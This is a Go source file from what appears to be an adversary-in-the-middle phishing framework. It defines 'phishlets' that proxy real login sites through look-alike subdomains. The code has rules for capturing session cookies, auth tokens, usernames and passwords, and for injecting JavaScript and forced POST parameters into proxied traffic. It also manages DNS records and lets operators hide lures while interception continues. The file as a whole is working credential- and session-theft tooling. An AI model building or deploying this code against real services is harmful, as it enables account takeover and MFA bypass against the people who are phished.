package aitm

import (
	"context"
	"fmt"
	"log/slog"
	"net"
	"regexp"
	"strings"
)

// phishletStore is the persistence interface required by PhishletService.
// It persists only operator config fields; compiled rule fields are never stored.
type phishletStore interface {
	GetPhishlet(name string) (*Phishlet, error)
	SetPhishlet(p *Phishlet) error
	ListPhishlets() ([]*Phishlet, error)
	DeletePhishlet(name string) error
}

// Phishlet is the unified type representing a phishlet — combining the compiled
// rules from its YAML file with the operator's runtime configuration.
//
// The compiled rule fields (ProxyHosts, SubFilters, etc.) are populated by the
// phishlet loader and are never persisted. The operator config fields (Hostname,
// BaseDomain, etc.) are persisted to the database and survive restarts.
//
// Either group of fields may be zero-valued: a freshly loaded YAML has no
// operator config; a record loaded from the database has no compiled rules.
// The daemon merges both at startup and on reload.
type Phishlet struct {
	// Identity (from YAML)
	Name    string
	Author  string
	Version string

	// Compiled rules (from YAML — in-memory only, never persisted)
	ProxyHosts  []ProxyHost
	SubFilters  []SubFilter
	AuthTokens  []TokenRule
	Credentials CredentialRules
	Login       LoginSpec
	ForcePosts  []ForcePost
	Intercepts  []InterceptRule
	JSInjects   []JSInject
	AuthURLs    []*regexp.Regexp

	// Operator config (persisted to SQLite)
	BaseDomain  string
	DNSProvider string
	Hostname    string
	UnauthURL   string
	SpoofURL    string
	Enabled     bool
	Hidden      bool
}

// applyOperatorConfig copies all operator-config fields from src into p.
// This is the single place that lists which fields are persisted, so adding a
// new operator field only requires updating this method.
func (p *Phishlet) applyOperatorConfig(src *Phishlet) {
	p.BaseDomain = src.BaseDomain
	p.DNSProvider = src.DNSProvider
	p.Hostname = src.Hostname
	p.UnauthURL = src.UnauthURL
	p.SpoofURL = src.SpoofURL
	p.Enabled = src.Enabled
	p.Hidden = src.Hidden
}

// MatchesHost reports whether hostname belongs to this phishlet under baseDomain.
func (p *Phishlet) MatchesHost(hostname, baseDomain string) bool {
	for _, host := range p.ProxyHosts {
		if hostname == host.PhishHost(baseDomain) {
			return true
		}
	}
	return false
}

// FindLanding returns the proxy host marked is_landing, or nil if none.
func (p *Phishlet) FindLanding() *ProxyHost {
	for i := range p.ProxyHosts {
		if p.ProxyHosts[i].IsLanding {
			return &p.ProxyHosts[i]
		}
	}
	return nil
}

// FindProxyHost returns the proxy host whose phishing FQDN matches phishHost,
// stripping any port and normalising case. Returns nil if no host matches.
func (p *Phishlet) FindProxyHost(phishHost string) *ProxyHost {
	host := phishHost
	if h, _, err := net.SplitHostPort(phishHost); err == nil {
		host = h
	}
	lowerHost := strings.ToLower(host)
	for i := range p.ProxyHosts {
		if strings.EqualFold(p.ProxyHosts[i].PhishHost(p.BaseDomain), lowerHost) {
			return &p.ProxyHosts[i]
		}
	}
	return nil
}

// MatchesAuthURL reports whether rawURL matches any of the phishlet's auth URL patterns.
func (p *Phishlet) MatchesAuthURL(rawURL string) bool {
	for _, authURL := range p.AuthURLs {
		if authURL.MatchString(rawURL) {
			return true
		}
	}
	return false
}

// ProxyHost maps a phishing subdomain to a real upstream host.
type ProxyHost struct {
	PhishSubdomain string
	OrigSubdomain  string
	Domain         string
	IsLanding      bool
	AutoFilter     bool
	UpstreamScheme string // "http" or "https"
}

// PhishHost returns the fully qualified phishing hostname
// (e.g. "login.phish.example.com").
func (h *ProxyHost) PhishHost(baseDomain string) string {
	return h.PhishSubdomain + "." + baseDomain
}

// OriginHost returns the fully qualified upstream hostname
// (e.g. "login.microsoftonline.com").
func (h *ProxyHost) OriginHost() string {
	if h.OrigSubdomain != "" {
		return h.OrigSubdomain + "." + h.Domain
	}
	return h.Domain
}

// SubFilter is a compiled search/replace rule applied to proxied response bodies.
type SubFilter struct {
	Hostname  string
	MimeTypes []string
	Search    *regexp.Regexp
	Replace   string
}

func (s *SubFilter) MatchesMIME(mimeType string) bool {
	for _, mime := range s.MimeTypes {
		if strings.HasPrefix(mimeType, mime) {
			return true
		}
	}
	return false
}

// TokenType classifies how an auth token is extracted.
type TokenType int

const (
	TokenTypeCookie TokenType = iota
	TokenTypeBody
	TokenTypeHTTPHeader
)

// TokenRule describes how to capture one auth token from a response.
type TokenRule struct {
	Type     TokenType
	Domain   string
	Path     *regexp.Regexp
	Name     *regexp.Regexp
	Search   *regexp.Regexp
	HTTPOnly bool
	Always   bool
}

// CredentialRules groups the extraction rules for username, password, and custom fields.
type CredentialRules struct {
	Username CredentialRule
	Password CredentialRule
	Custom   []CustomCredentialRule
}

// CredentialRule is a key+search regex pair that extracts one field from POST/JSON.
type CredentialRule struct {
	Key    *regexp.Regexp
	Search *regexp.Regexp
	Type   string // "post" or "json"
}

// CustomCredentialRule is like CredentialRule but stores into Session.Custom[Name].
type CustomCredentialRule struct {
	Name string
	CredentialRule
}

// LoginSpec identifies where the login form lives.
type LoginSpec struct {
	Domain string
	Path   string
}

// ForcePost describes a POST parameter to inject or override.
type ForcePost struct {
	Path       *regexp.Regexp
	Conditions []ForcePostCondition
	Params     []ForcePostParam
}

type ForcePostCondition struct {
	Key    *regexp.Regexp
	Search *regexp.Regexp
}

type ForcePostParam struct {
	Key   string
	Value string
}

// InterceptRule matches a request and returns a fully custom response.
type InterceptRule struct {
	Path        *regexp.Regexp
	BodySearch  *regexp.Regexp
	StatusCode  int
	ContentType string
	Body        string
}

// JSInject defines a JavaScript snippet to inject into matching pages.
type JSInject struct {
	TriggerDomain string
	TriggerPath   *regexp.Regexp
	Script        string
}

// PhishletService owns all business logic for phishlet lifecycle.
// It is the single point of truth for which phishlets are active: every
// enable/disable writes to the store AND updates the in-memory resolver,
// so the proxy router never falls out of sync with the database.
// dnsReconciler manages DNS records for phishlet proxy hosts.
type dnsReconciler interface {
	Reconcile(ctx context.Context, records []PhishletRecord) error
	RemoveRecords(ctx context.Context, records []PhishletRecord) error
}

type PhishletService struct {
	store    phishletStore
	bus      eventBus
	dns      dnsReconciler
	resolver *phishletResolver
}

func NewPhishletService(store phishletStore, bus eventBus, dns dnsReconciler, lureStore lureStore, logger *slog.Logger) *PhishletService {
	return &PhishletService{
		store:    store,
		bus:      bus,
		dns:      dns,
		resolver: newPhishletResolver(lureStore, logger),
	}
}

// LoadFromDB merges stored operator configs into the routing index and
// populates the lure cache. Call once during startup after YAML files have
// been loaded, before the proxy begins accepting connections.
func (s *PhishletService) LoadFromDB() error {
	stored, err := s.store.ListPhishlets()
	if err != nil {
		return fmt.Errorf("loading phishlets: %w", err)
	}

	for _, storedPhishlet := range stored {
		p := s.resolver.get(storedPhishlet.Name)
		if p == nil {
			// YAML not loaded yet — register config-only so the operator can still
			// query and modify it via the API.
			s.resolver.register(storedPhishlet)
			continue
		}

		merged := *p
		merged.applyOperatorConfig(storedPhishlet)
		s.resolver.register(&merged)
	}

	return s.resolver.loadLuresFromDB()
}

// Register stores a compiled phishlet definition in the routing index.
// Call this when loading phishlets from YAML files at startup or on live reload.
// It does not persist anything — use Enable to activate a phishlet with operator config.
func (s *PhishletService) Register(p *Phishlet) {
	s.resolver.register(p)
}

// ResolveHostname returns the phishlet and best-matching lure for a request hostname.
// Returns nil, nil, nil when no active phishlet owns the hostname.
func (s *PhishletService) ResolveHostname(hostname, urlPath string) (*Phishlet, *Lure, error) {
	return s.resolver.resolveHostname(hostname, urlPath)
}

// InvalidateLures reloads the lure cache after any lure mutation.
// Satisfies the lureInvalidator interface so LureService can notify the routing index.
func (s *PhishletService) InvalidateLures() {
	s.resolver.invalidateLures()
}

// Enable marks a phishlet as active, optionally updating its hostname, base
// domain, and DNS provider. The resolver is updated atomically so routing
// takes effect immediately without a restart.
func (s *PhishletService) Enable(name, hostname, dnsProvider string) (*Phishlet, error) {
	p := s.currentOrNew(name)
	if hostname != "" {
		p.Hostname = hostname
	}
	if dnsProvider != "" {
		p.DNSProvider = dnsProvider
	}
	if p.Hostname == "" {
		return nil, ErrHostnameRequired
	}
	if p.BaseDomain == "" {
		p.BaseDomain = deriveBaseDomain(s.resolver.get(name), p.Hostname)
	}
	if owner := s.resolver.ownerOf(p.Hostname); owner != "" && owner != p.Name {
		return nil, ErrHostnameConflict
	}
	p.Enabled = true
	if err := s.store.SetPhishlet(p); err != nil {
		return nil, err
	}
	s.resolver.register(p)
	s.bus.Publish(Event{Type: EventPhishletEnabled, Payload: p})
	return p, nil
}

// deriveBaseDomain infers the base domain from the phishing hostname by matching
// each proxy host's PhishSubdomain as a prefix. Returns "" if no match is found.
func deriveBaseDomain(def *Phishlet, hostname string) string {
	if def == nil {
		return ""
	}
	hostname = strings.ToLower(hostname)
	for _, proxyHost := range def.ProxyHosts {
		prefix := strings.ToLower(proxyHost.PhishSubdomain) + "."
		if strings.HasPrefix(hostname, prefix) {
			return hostname[len(prefix):]
		}
	}
	return ""
}

// Disable marks a phishlet as inactive.
func (s *PhishletService) Disable(name string) (*Phishlet, error) {
	p, err := s.currentOrErr(name)
	if err != nil {
		return nil, err
	}
	p.Enabled = false
	if err := s.store.SetPhishlet(p); err != nil {
		return nil, err
	}
	s.resolver.register(p)
	return p, nil
}

// Hide marks a phishlet as hidden (suppressed from lure URL generation).
// Does not affect routing — the phishlet keeps intercepting traffic.
func (s *PhishletService) Hide(name string) (*Phishlet, error) {
	p, err := s.currentOrErr(name)
	if err != nil {
		return nil, err
	}
	p.Hidden = true
	if err := s.store.SetPhishlet(p); err != nil {
		return nil, err
	}
	s.resolver.register(p)
	return p, nil
}

// Unhide reverses Hide.
func (s *PhishletService) Unhide(name string) (*Phishlet, error) {
	p, err := s.currentOrErr(name)
	if err != nil {
		return nil, err
	}
	p.Hidden = false
	if err := s.store.SetPhishlet(p); err != nil {
		return nil, err
	}
	s.resolver.register(p)
	return p, nil
}

// Get returns the phishlet by name, preferring the resolver's in-memory
// copy (which has compiled rules) over the store.
func (s *PhishletService) Get(name string) (*Phishlet, error) {
	if p := s.resolver.get(name); p != nil {
		return p, nil
	}
	return s.store.GetPhishlet(name)
}

// List returns all stored phishlet operator configs.
func (s *PhishletService) List() ([]*Phishlet, error) {
	return s.store.ListPhishlets()
}

// currentOrNew returns a copy of the registered phishlet (if any), otherwise
// a shell loaded from the store or newly created.
func (s *PhishletService) currentOrNew(name string) *Phishlet {
	if p := s.resolver.get(name); p != nil {
		copy := *p
		return &copy
	}
	stored, err := s.store.GetPhishlet(name)
	if err != nil {
		return &Phishlet{Name: name}
	}
	return stored
}

// currentOrErr returns a copy of the current phishlet state or an error if not found anywhere.
func (s *PhishletService) currentOrErr(name string) (*Phishlet, error) {
	if p := s.resolver.get(name); p != nil {
		copy := *p
		return &copy, nil
	}
	return s.store.GetPhishlet(name)
}
